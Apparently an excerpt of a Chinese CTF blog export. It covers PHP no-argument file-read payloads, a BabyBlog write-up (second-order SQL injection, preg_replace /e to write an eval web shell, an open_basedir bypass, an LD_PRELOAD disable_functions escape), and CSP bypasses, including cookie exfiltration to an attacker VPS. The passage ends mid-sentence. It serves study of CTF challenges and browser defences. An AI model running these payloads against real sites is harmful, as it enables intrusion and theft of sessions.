<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(pos(localtime()))))))))))))</span><br></pre></td></tr></table></figure>

<p>time的方法还是比较简单的，在网上也搜到了一些其他有趣的payload，来学一下</p>
<ul>
<li>第一种</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>(serialize(file(end(scandir(chr(ord(chr(time(chdir(next(scandir(chr(ord(chr(time())))))))))))))));</span><br></pre></td></tr></table></figure>

<p>这个payload关键点和上面的其实差不多，但是echo(serialize(file()))这个操作挺有意思，因为file返回的是数组，所以先序列化一下，最后输出的序列化的值，但也可以直接readfile，在readfile过滤的情况下，我们就用这个了。</p>
<ul>
<li>第二种</li>
</ul>
<p>用localeconv取得.符号</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));</span><br></pre></td></tr></table></figure>

<p>这个if是真的好用</p>
<ul>
<li>第三种</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里可以变的更加复杂去绕过一些过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到陌小生大佬的博客中一条有趣的payload</p>
<p>通过chr(octdec(ord(ceil(sqrt(ord(exp()))))))拿到<code>.</code>，膜一下。</p>
<ul>
<li>第四种</li>
</ul>
<p>这是一个看起来很心酸的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br></pre></td></tr></table></figure>

<p>学习了。</p>
<p>这题有个坑点.之前不太明白，看到kn0ck的wp才恍然大悟</p>
<blockquote>
<p>p.s.坑点：一定要在服务器上起个服务，来打印以上语句。不能把他作为文件传上去。默认读取下载文件，会在后面加一个空行。空行过不了正则…</p>
</blockquote>
<p>所以我们要在我们的vps上把我们的payload echo出来</p>
<h3 id="BabyBlog"><a href="#BabyBlog" class="headerlink" title="BabyBlog"></a>BabyBlog</h3><p>首先题目给了源码</p>
<p>大致看了一下题目的代码</p>
<p>首先在config中对GET和POST变量进行了全局过滤</p>
<p>在对文章进行操作的时候都需要先进行从文章中拿出userid与用户的session中的id比较一下，如果相同的话即可进行操作，在edit.php中存在问题</p>
<p>首先也是判断row[‘id’]，如果一致就把这个页面渲染给用户，问题部分如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'content'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($sql-&gt;query(<span class="string">"select * from article where id="</span> . intval($_POST[<span class="string">'id'</span>]) . <span class="string">";"</span>) <span class="keyword">as</span> $v)&#123;</span><br><span class="line">        $row = $v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'id'</span>] == $row[<span class="string">'userid'</span>])&#123;</span><br><span class="line">        $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">        $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">        $sql-&gt;query(<span class="string">"update article set title='$title',content='$content' where title='"</span> . $row[<span class="string">'title'</span>] . <span class="string">"';"</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Edited successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在update的时候$row[‘title’]可造成二次注入，我们可以直接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;; update users set isvip&#x3D;1 where username&#x3D;&#39;lihuaiqiu&#39;;</span><br></pre></td></tr></table></figure>

<p>插入进去一个vip用户</p>
<p>不过有过滤，这里可以用预处理bypass</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">';set @test=0x757064617465757365727373657469737669703d317768657265757365726e616d653d276c6968756169716975273b;prepare sql from @test;execute sql;</span></span><br></pre></td></tr></table></figure>

<p>成为vip后我们就开启了replace功能，看一下replace.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'id'</span>] == $row[<span class="string">'userid'</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'regex'</span>]) &amp;&amp; $_POST[<span class="string">'regex'</span>] == <span class="string">'1'</span>)&#123;</span><br><span class="line">            $content = addslashes(preg_replace(<span class="string">"/"</span> . $_POST[<span class="string">'find'</span>] . <span class="string">"/"</span>, $_POST[<span class="string">'replace'</span>], $row[<span class="string">'content'</span>]));</span><br><span class="line">            $sql-&gt;query(<span class="string">"update article set content='$content' where id="</span> . $row[<span class="string">'id'</span>] . <span class="string">";"</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Replaced successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $content = addslashes(str_replace($_POST[<span class="string">'find'</span>], $_POST[<span class="string">'replace'</span>], $row[<span class="string">'content'</span>]));</span><br><span class="line">            $sql-&gt;query(<span class="string">"update article set content='$content' where id="</span> . $row[<span class="string">'id'</span>] . <span class="string">";"</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Replaced successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题出现于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$content &#x3D; addslashes(preg_replace(&quot;&#x2F;&quot; . $_POST[&#39;find&#39;] . &quot;&#x2F;&quot;, $_POST[&#39;replace&#39;], $row[&#39;content&#39;]));</span><br></pre></td></tr></table></figure>

<p>这里我们的$_POST[‘find’]如果可控的话就可以自己通过%00截断来添加/e修饰符进而执行我们的php代码</p>
<p>find=/e%00&amp;replace=file_put_contents(“shell.php”,’&lt;?php eval($_POST[1]);’);</p>
<p>拿到shell后，看一下phpinfo();的信息，做了两层防护，一个disable_functions，一个open_basedir，</p>
<p>这个是个低版本的php,我们可以通过glob来bypass一下open_basedir</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($dh = opendir(<span class="string">"glob:///*"</span>)) &#123;</span><br><span class="line"><span class="keyword">while</span> (($file = readdir($dh)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$file\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">closedir($dh);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到根目录下有readflag,那就是执行这个就行了，接着bypass disable_functions,大概试了一下,ban掉了mail，但是error_log依然在，所以可以直接通过error_log执行系统命令了</p>
<p>hack.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"/readflag &gt; flag"</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc -shared hack -o hack.so</span><br></pre></td></tr></table></figure>

<p>exp.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=/var/www/hack.so"</span>);</span><br><span class="line">error_log(<span class="string">''</span>,<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将生成的hack.so放到html目录，引入后通过error_log(第二个参数为1)执行命令，拿到flag.</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSP &amp; CSP-Bypass</title>
    <url>/2019/10/31/CSP-CSP-Bypass/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看了ROIS的XCTF Final wp真的感觉自己…会的太少了…，同时感觉在生活中把个人情感和个人学习分开的能力是真的重要(终于遇到了那个可爱的她了，希望一切顺利），努力锻炼自己的各个方面能力吧，希望可以变得优秀一些。</p>
<h3 id="CSP简介"><a href="#CSP简介" class="headerlink" title="CSP简介"></a>CSP简介</h3><p>在了解csp的bypass操作之前，需要先了解一下什么是csp。</p>
<blockquote>
<p>CSP 的主要目标是减少和报告 XSS 攻击 ，XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。</p>
<p>CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)。</p>
<p>作为一种终极防护形式，始终不允许执行脚本的站点可以选择全面禁止脚本执行。</p>
</blockquote>
<h3 id="常见的CSP声明"><a href="#常见的CSP声明" class="headerlink" title="常见的CSP声明"></a>常见的CSP声明</h3><h4 id="指令与内容源"><a href="#指令与内容源" class="headerlink" title="指令与内容源"></a>指令与内容源</h4><p>CSP主要有三个header，分别是：Content-Security-Policy，X-Content-Security-Policy，X-WebKit-CSP。</p>
<p>平时最为常见的是Content Security Policy</p>
<p>我们对CSP的启动调用有两种方法</p>
<ul>
<li>HTTP头信息的Content-Security-Policy字段</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' www.baidu.com; script-src 'unsafe-inline'</span><br></pre></td></tr></table></figure>

<ul>
<li>通过网页的meta标签来定义</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>从上面的两种CSP声明方法我们可以看出来一个CSP头是由多组CSP策略组成的，并且中间由分号相隔，每一组策略包含一个策略指令和一个内容源列表，策略指令常见如下：</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>default-src</td>
<td>定义资源默认加载策略</td>
</tr>
<tr>
<td>connect-src</td>
<td>定义 Ajax、WebSocket 等加载策略</td>
</tr>
<tr>
<td>font-src</td>
<td>定义 Font 加载策略</td>
</tr>
<tr>
<td>frame-src</td>
<td>定义 Frame 加载策略</td>
</tr>
<tr>
<td>img-src</td>
<td>定义图片加载策略</td>
</tr>
<tr>
<td>media-src</td>
<td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td>
</tr>
<tr>
<td>object-src</td>
<td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td>
</tr>
<tr>
<td>script-src</td>
<td>定义 JS 加载策略</td>
</tr>
<tr>
<td>style-src</td>
<td>定义 CSS 加载策略</td>
</tr>
<tr>
<td>sandbox</td>
<td>值为 allow-forms，对资源启用 sandbox</td>
</tr>
<tr>
<td>report-uri</td>
<td>值为 /report-uri，提交日志</td>
</tr>
</tbody></table>
<p>内容源常见选项如下：</p>
<table>
<thead>
<tr>
<th>源</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td>
</tr>
<tr>
<td>*.foo.com</td>
<td>允许加载foo.com子域的资源</td>
</tr>
<tr>
<td>abc.foo.com</td>
<td>只能加载这个域名下的资源</td>
</tr>
<tr>
<td><a href="https://a.com/" target="_blank" rel="noopener">https://a.com</a></td>
<td>只能用HTTPS加载域名下的资源</td>
</tr>
<tr>
<td>https:</td>
<td>通过HTTPS可以加载任意域名下的资源</td>
</tr>
<tr>
<td>‘none’</td>
<td>代表空集,即不匹配任何URL,两侧单引号是必须的</td>
</tr>
<tr>
<td>‘self’</td>
<td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td>
</tr>
<tr>
<td>‘unsafe-inline’</td>
<td>允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的</td>
</tr>
<tr>
<td>‘unsafe-eval’</td>
<td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td>
</tr>
<tr>
<td>data:</td>
<td>允许data: URI作为内容来源</td>
</tr>
<tr>
<td>mediastream:</td>
<td>允许mediastream: URI作为内容来源</td>
</tr>
</tbody></table>
<p>补充几个lorexxar师傅博客中举的例子</p>
<h4 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h4><p><strong>child-src主要限制嵌套浏览的部分（如iframe和frame标签引入的内容）</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">举一个页面的例子:</span><br><span class="line">首先设置csp</span><br><span class="line">Content-Security-Policy: child-src https://example.com/</span><br><span class="line">而下面的请求会被CSP拦截</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://not-example.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">var</span> blockedWorker = <span class="keyword">new</span> Worker(<span class="string">"data:application/javascript,..."</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h4><p><strong>font-src指定限制所有被加载的字体资源</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">举个例子:</span><br><span class="line">Content-Security-Policy: font-src https://example.com/</span><br><span class="line">下面的请求都会返回错误</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line">    font-family: "Example Font";</span><br><span class="line">    src: url("https://not-example.com/font");</span><br><span class="line">  &#125;</span><br><span class="line">  body &#123;</span><br><span class="line">    font-family: "Example Font";</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Style-src"><a href="#Style-src" class="headerlink" title="Style-src"></a>Style-src</h4><p>style-src指令限制了所有可能被引用的css，包括下面三种引用的css属性，style也有个’unsafe-inline’这个参数，同理会允许所有的内联css。</p>
<ul>
<li>通过link标签加载css</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;link href="001.css" type="text/css" rel="Stylesheet"/&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过style标签加载css</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"><span class="selector-class">.main</span>&#123; <span class="attribute">width</span>:<span class="number">1002px</span>; <span class="attribute">margin</span>:<span class="number">0</span> auto;&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过@import引入css</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt; STYLE TYPE="text/css"&gt;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">"example.css"</span>;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">"style/other.css"</span>;</span><br><span class="line">&lt; /STYLE&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>内联样式表</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">style="font-size:10px;font-color:#ff0000"</span><br></pre></td></tr></table></figure>

<p>还有就是default-src声明的覆盖的操作，default-src是作为所有其他指令的备用的，所以可以产生覆盖的现象，比如如下的csp声明</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none'; script-src 'self'</span><br></pre></td></tr></table></figure>

<p>那么第二条就会覆盖掉第一条的default-src的声明，所以这条CSP最终的意义为</p>
<p><strong>script-src加载同源的引入内容，其他的所有指令遵从default-src的声明，为none。</strong></p>
<h3 id="Bypass-CSP"><a href="#Bypass-CSP" class="headerlink" title="Bypass-CSP"></a>Bypass-CSP</h3><h4 id="Link标签预加载Bypass-CSP"><a href="#Link标签预加载Bypass-CSP" class="headerlink" title="Link标签预加载Bypass CSP"></a>Link标签预加载Bypass CSP</h4><p>这个好像只适用于老版的浏览器了，最新版本的Google已经免疫了Prefech</p>
<p>csp.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self' 'unsafe-inline';"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"//xxx"</span>&gt;</span> //Payload For Google</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//$&#123;cookie&#125;.vps_ip"</span>&gt;</span> //Payload For FireFox</span><br></pre></td></tr></table></figure>

<p>可以从下图看出我们的href去访问不同源的网站直接被defaulf-src ban掉了</p>
<p><a href="https://imgchr.com/i/Kf8PyQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/29/Kf8PyQ.md.png" alt="Kf8PyQ.md.png"></a></p>
<p>但是在老版本谷歌应该是可以的，我看很多师傅的博客都是写了一个这样的payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self' 'unsafe-inline';"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> i=<span class="built_in">document</span>.createElement(<span class="string">'link'</span>);</span></span><br><span class="line"><span class="actionscript">        i.setAttribute(<span class="string">'rel'</span>,<span class="string">'prefetch'</span>);</span></span><br><span class="line"><span class="javascript">        i.setAttribute(<span class="string">'href'</span>,<span class="string">'http://xx?'</span>+<span class="built_in">document</span>.cookie);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.head.appendChild(i);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是我在谷歌最新版本的测试情况效果和上面的图是一样的,不过在default-src没设置的情况下是可用的。</p>
<h4 id="Iframe-Bypass-Csp"><a href="#Iframe-Bypass-Csp" class="headerlink" title="Iframe Bypass Csp"></a>Iframe Bypass Csp</h4><p>这个是有一定的限制条件了，假设我们有两个页面分别为A和B,二者同源，其中一个设有CSP保护，一个没有CSP保护</p>
<p>A页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'self'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>B页面</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iframe.src=<span class="string">"A页面"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">'test'</span>).innerHTML),<span class="number">1000</span>);</span><br><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>

<p>从evoa师傅的博客学到了,先设置延时等待iframe子窗口加载完毕，再去获得test元素。</p>
<h4 id="Base标签-Bypass-Csp"><a href="#Base标签-Bypass-Csp" class="headerlink" title="Base标签 Bypass Csp"></a>Base标签 Bypass Csp</h4><p>RCTF2018非预期解 [<a href="https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup]" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup]</a>(<a href="https://blog.cal1.cn/post/RCTF" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF</a> 2018 rBlog writeup)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-test'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"//vps_ip/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"2.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于base-uri不会用default作为fallback,所以导致成功xss。</p>
<p><a href="https://imgchr.com/i/KffiPP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/KffiPP.md.png" alt="KffiPP.md.png"></a></p>
<h4 id="浏览器补全Bypass-Csp"><a href="#浏览器补全Bypass-Csp" class="headerlink" title="浏览器补全Bypass Csp"></a>浏览器补全Bypass Csp</h4><p>CSP设置如下</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none';script-src 'nonce-abc'</span><br></pre></td></tr></table></figure>

<p>新版本浏览器似乎又使很多操作失效了，比如</p>
<p><a href="https://imgchr.com/i/Khqla8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/Khqla8.md.png" alt="Khqla8.md.png"></a></p>
<p>这个是之前大师傅们博客中的操作</p>
<p>但是我在谷歌和火狐似乎都失败了，我的测试代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Security-Policy"</span> content=<span class="string">"default-src 'self'; script-src 'nonce-abc'"</span>&gt;</span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>];<span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;script nonce=<span class="string">"abc"</span>&gt;document.write(<span class="string">'CSP'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>火狐下</p>
<p><a href="https://imgchr.com/i/KhLhXn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/KhLhXn.md.png" alt="KhLhXn.md.png"></a></p>
<p>本来文章中的双引号闭合并没有出现，当然这是在p标签中插入的情况下，如果没有p标签的约束呢</p>
<p>比如evoA师傅中博客中的例子</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> header(<span class="string">"X-XSS-Protection:0"</span>);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-xxxxx'"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'xxxxx'</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">//do some thing</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/KhjYkV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/KhjYkV.md.png" alt="KhjYkV.md.png"></a></p>
<p>在没有p标签的情况下我们的确可以xss，不过加了p标签就不闭合了</p>
<p>不过在我们在script的type为text/javascript的情况下是可以xss的，有点神奇，不过依然只是对Firefox有效</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"X-XSS-Protection:0"</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Security-Policy"</span> content=<span class="string">"default-src 'self'; script-src 'nonce-xxxxx'"</span>&gt;</span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>  nonce=<span class="string">'xxxxx'</span>&gt;</span><br><span class="line">  <span class="comment">//do some thing</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/K4mJW4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K4mJW4.md.png" alt="K4mJW4.md.png"></a></p>
<p><img src="https://s2.ax1x.com/2019/10/30/K4mrFO.png" alt="K4mrFO.png"></p>
<p>很明显可以看出来…和google的自闭和不太一样</p>
<p>思考：为什么多了一个p标签的话，本来的<code>&lt;script src=&quot;data:text/plain,alert(1)&quot; a=</code>就失效了</p>
<p>下面是一组对比</p>
<p><a href="https://imgchr.com/i/K4f5QK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K4f5QK.md.png" alt="K4f5QK.md.png"></a></p>
<p>右图可xss，左图无法xss，个人感觉是因为a后面是自动添加的双引号，这个双引号只能去自动闭合一个不完整的标签，比如闭合<code>&lt;/p&gt;</code>中的&lt;/p，和&lt;script，以后如果有更好的研究的话可以重新来看一下这个问题。</p>
<p>可以看到在type=”text/javascript”的情况下，如果我们不自己添加双引号的浏览器自添加效果为</p>
<p><a href="https://imgchr.com/i/K44GNj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K44GNj.md.png" alt="K44GNj.md.png"></a></p>
<p>这个的Bypass还是主要通过自己添加一个双引号，比如a=”，浏览器给的闭合可能直接是<code>a=&quot;&lt;/p&gt;&lt;script&quot;</code>，不过现在不在type=”text/javascript’’的情况下去使用这个payload，直接报错了。</p>
<p><a href="https://imgchr.com/i/K444bD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K444bD.md.png" alt="K444bD.md.png"></a></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="通过文件上传Bypass-CSP"><a href="#通过文件上传Bypass-CSP" class="headerlink" title="通过文件上传Bypass CSP"></a>通过文件上传Bypass CSP</h4><p>比如cctf 2016</p>
<p>上传swf文件如下</p>
